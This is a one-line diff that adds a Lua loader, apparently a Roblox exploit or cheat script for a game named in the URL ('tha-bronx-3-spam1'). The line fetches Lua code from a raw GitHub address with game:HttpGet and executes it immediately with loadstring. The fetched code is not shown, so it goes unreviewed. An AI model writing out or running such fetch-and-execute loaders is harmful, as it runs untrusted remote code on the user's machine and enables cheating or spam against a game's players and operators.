@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/tha-bronx-3-spam1-670aqbqojrmw9b.lua"))()
